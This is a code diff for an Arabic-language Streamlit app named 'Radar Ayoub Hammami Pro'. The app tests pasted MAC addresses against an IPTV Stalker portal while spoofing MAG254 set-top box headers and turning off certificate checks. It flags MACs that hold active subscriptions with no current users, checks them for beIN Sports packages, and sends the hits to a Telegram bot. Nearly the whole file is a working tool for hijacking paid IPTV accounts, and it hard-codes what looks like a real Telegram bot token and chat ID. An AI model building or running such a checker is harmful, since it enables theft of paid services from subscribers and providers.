@@ -4,109 +4,134 @@ import time
 import telebot
 import re
 import urllib3
+from datetime import datetime
 
-# إيقاف تنبيهات الأمان للسيرفرات ذات الشهادات الضعيفة
+# إيقاف التحذيرات الأمنية لضمان استمرارية الفحص
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# --- بياناتك الثابتة ---
+# --- إعدادات الاتصال (بياناتك) ---
 TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
 ID = 7638628794
 bot = telebot.TeleBot(TOKEN)
 
-# الكلمات المفتاحية
-CHANNELS_KEYS = {
+# الباقات المفضلة للبحث عنها
+FAV_CHANNELS = {
     "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
     "IARI BEIN SPORTS 8K": ["8K", "IARI"],
     "IARI BEIN SPORTS 4K": ["4K", "IARI"]
 }
 
-# إعداد واجهة الرادار
-st.set_page_config(page_title="Radar Ayoub Hammami", page_icon="📡")
-st.markdown("<h1 style='text-align: center; color: #FF4B4B;'>📡 Radar Ayoub Hammami Pro</h1>", unsafe_allow_html=True)
+# --- واجهة المستخدم ---
+st.set_page_config(page_title="Radar Ayoub Hammami Pro", layout="wide")
 
-raw_data = st.text_area("ضع البيانات هنا (الرابط والماكات):", height=150)
+st.markdown("""
+    <style>
+    .status-working { color: #00FF00; font-weight: bold; }
+    .status-offline { color: #FF0000; font-weight: bold; }
+    .stMetric { background-color: #111; padding: 10px; border-radius: 10px; border-left: 5px solid #ff4b4b; }
+    </style>
+    """, unsafe_allow_html=True)
 
-def get_mag_headers(mac):
-    """محاكاة كاملة لجهاز MAG254"""
+st.title("📡 Radar Ayoub Hammami Pro V2")
+st.subheader("نظام الفحص السري والمتطور للسيرفرات")
+
+input_text = st.text_area("🚀 الصق الرابط والماكات هنا (سيتم استخراجها تلقائياً):", height=150)
+
+def get_stealth_headers(mac):
+    """توليد رأسيات طلب متخفية تحاكي جهاز MAG254 حقيقي تماماً"""
     return {
-        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Safari/533.3',
         'X-User-Agent': 'Model: MAG254; Link: WiFi',
         'Cookie': f'mac={mac}',
-        'Accept': '*/*',
         'Referer': 'http://mag.infomir.com/',
-        'Connection': 'keep-alive'
+        'Accept': '*/*',
+        'Connection': 'keep-alive',
+        'Accept-Language': 'en-US,*'
     }
 
-if st.button("🚀 تشغيل الرادار"):
-    if raw_data:
-        # استخراج الماكات والروابط
-        macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', raw_data.upper())))
-        host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', raw_data)
+if st.button("🏁 بدء عملية الصيد السري"):
+    # استخراج البيانات عبر Regex
+    macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', input_text.upper())))
+    host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', input_text)
+    
+    if host_match and macs:
+        base_url = host_match.group(0).split('/portal.php')[0].rstrip('/')
+        api_url = f"{base_url}/portal.php"
         
-        if host_match and macs:
-            # تنظيف الرابط والتأكد من وجود portal.php
-            base_url = host_match.group(0).split('/portal.php')[0].rstrip('/')
-            api_url = f"{base_url}/portal.php"
-            
-            st.success(f"📡 السيرفر المستهدف: {base_url}")
-            
-            # عدادات النتائج
-            checked_count = 0
-            found_count = 0
-            c1, c2 = st.columns(2)
-            stat_checked = c1.metric("تم فحص", "0")
-            stat_found = c2.metric("الصيد الذهبي", "0")
-            
-            progress = st.progress(0)
-            log_box = st.empty()
-
-            for i, current_mac in enumerate(macs):
-                checked_count += 1
-                headers = get_mag_headers(current_mac)
+        st.info(f"🌐 السيرفر المستهدف: {base_url} | 🎯 عدد الماكات: {len(macs)}")
+        
+        # لوحة العدادات
+        c1, c2, c3 = st.columns(3)
+        checked_stat = c1.empty()
+        found_stat = c2.empty()
+        
+        progress = st.progress(0)
+        results = []
+        
+        for i, mac in enumerate(macs):
+            headers = get_stealth_headers(mac)
+            try:
+                # 1. فحص البروفايل (للحالة، المستخدمين، والتاريخ)
+                start_time = time.time()
+                r = requests.get(f"{api_url}?type=stb&action=get_profile&force_stb=1", 
+                                 headers=headers, timeout=10, verify=False)
+                latency = (time.time() - start_time) * 1000
                 
-                try:
-                    # فحص البروفايل
-                    profile_url = f"{api_url}?type=stb&action=get_profile&force_stb=1"
-                    r = requests.get(profile_url, headers=headers, timeout=12, verify=False)
+                if r.status_code == 200 and '"active_cons"' in r.text:
+                    # تحليل البيانات
+                    active_users = re.search(r'"active_cons"\s*:\s*"(\d+)"', r.text).group(1)
+                    expiry = re.search(r'"end_date"\s*:\s*"([^"]+)"', r.text).group(1) if '"end_date"' in r.text else "غير محدد"
                     
-                    # التحقق من أن السيرفر رد ببيانات صحيحة
-                    if r.status_code == 200 and '"active_cons"' in r.text:
-                        active_match = re.search(r'"active_cons"\s*:\s*"(\d+)"', r.text)
-                        is_active = active_match.group(1) if active_match else "1"
+                    # قوة السيرفر بناءً على سرعة الاستجابة
+                    strength = "قوي (ثابت) ✅" if latency < 800 else "متقطع (ضعيف) ⚠️"
+                    
+                    # 2. فحص الباقات المفضلة
+                    r_ch = requests.get(f"{api_url}?type=itv&action=get_all_channels", 
+                                        headers=headers, timeout=10, verify=False)
+                    ch_text = r_ch.text.upper()
+                    found_favs = [name for name, keys in FAV_CHANNELS.items() if all(k in ch_text for k in keys)]
+                    
+                    # عرض الحالة باللون الأخضر في الجدول
+                    status_html = '<span class="status-working">يشتغل 🟢</span>'
+                    
+                    res_data = {
+                        "الماك": mac,
+                        "الحالة": "يشتغل",
+                        "القوة": strength,
+                        "المستخدمين": active_users,
+                        "تاريخ الانتهاء": expiry,
+                        "الباقات": ", ".join(found_favs) if found_favs else "❌ غير متوفرة"
+                    }
+                    results.append(res_data)
+                    
+                    # إرسال تنبيه تلغرام فور الصيد
+                    if active_users == "0":
+                        alert = (f"🎯 **صيد ذهبي جديد!**\n\n"
+                                 f"🖥️ الماك: `{mac}`\n"
+                                 f"📊 القوة: {strength}\n"
+                                 f"👥 المستخدمين الآن: {active_users}\n"
+                                 f"📅 الانتهاء: `{expiry}`\n"
+                                 f"🌐 السيرفر: {base_url}\n"
+                                 f"📺 الباقات: {', '.join(found_favs) if found_favs else 'لا توجد'}")
+                        bot.send_message(ID, alert, parse_mode="Markdown")
+                        st.toast(f"✅ تم صيد ماك متاح: {mac}")
 
-                        if is_active == "0":
-                            found_count += 1
-                            # فحص القنوات
-                            ch_url = f"{api_url}?type=itv&action=get_all_channels"
-                            r_ch = requests.get(ch_url, headers=headers, timeout=12, verify=False)
-                            ch_text = r_ch.text.upper()
-                            
-                            found_channels = [n for n, k in CHANNELS_KEYS.items() if all(x in ch_text for x in k)]
-                            
-                            # إرسال التنبيه
-                            msg = (f"🎯 **صيد جديد - Ayoub**\n\n"
-                                   f"🖥️ الماك: `{current_mac}`\n"
-                                   f"🌐 السيرفر: `{base_url}`\n"
-                                   f"📺 القنوات المستهدفة: {', '.join(found_channels) if found_channels else 'غير موجودة'}\n"
-                                   f"👤 المطور: Ayoub Hammami")
-                            bot.send_message(ID, msg, parse_mode="Markdown")
-                            st.toast(f"✅ متاح: {current_mac}")
-                        else:
-                            log_box.warning(f"⚠️ الماك مشغول (متصل): {current_mac}")
-                    else:
-                        log_box.info(f"🔎 الماك غير صالح أو منتهي: {current_mac}")
-                
-                except Exception:
-                    log_box.error(f"❌ خطأ في الوصول للسيرفر للماك: {current_mac}")
+                else:
+                    results.append({"الماك": mac, "الحالة": "معطل 🔴", "القوة": "-", "المستخدمين": "-", "تاريخ الانتهاء": "-", "الباقات": "-"})
+            
+            except Exception:
+                results.append({"الماك": mac, "الحالة": "معطل 🔴", "القوة": "فشل اتصال", "المستخدمين": "-", "تاريخ الانتهاء": "-", "الباقات": "-"})
+            
+            # تحديث العدادات
+            checked_stat.metric("إجمالي الفحص", i + 1)
+            found_stat.metric("الماكات المتاحة (0 متصل)", len([r for r in results if r.get("المستخدمين") == "0"]))
+            progress.progress((i + 1) / len(macs))
+            time.sleep(0.5)
 
-                # تحديث الواجهة
-                stat_checked.metric("تم فحص", checked_count)
-                stat_found.metric("الصيد الذهبي", found_count)
-                progress.progress((i + 1) / len(macs))
-                time.sleep(0.8) # سرعة متوازنة لتجنب الحظر
+        # عرض النتائج في جدول نهائي
+        st.divider()
+        st.table(results)
+        st.balloons()
 
-            st.balloons()
-        else:
-            st.error("❌ الرابط أو الماكات غير مكتشفة في النص.")
     else:
-        st.warning("⚠️ يرجى لصق البيانات أولاً.")
+        st.error("❌ خطأ: يرجى التأكد من وضع رابط صحيح وماكات صالحة.")
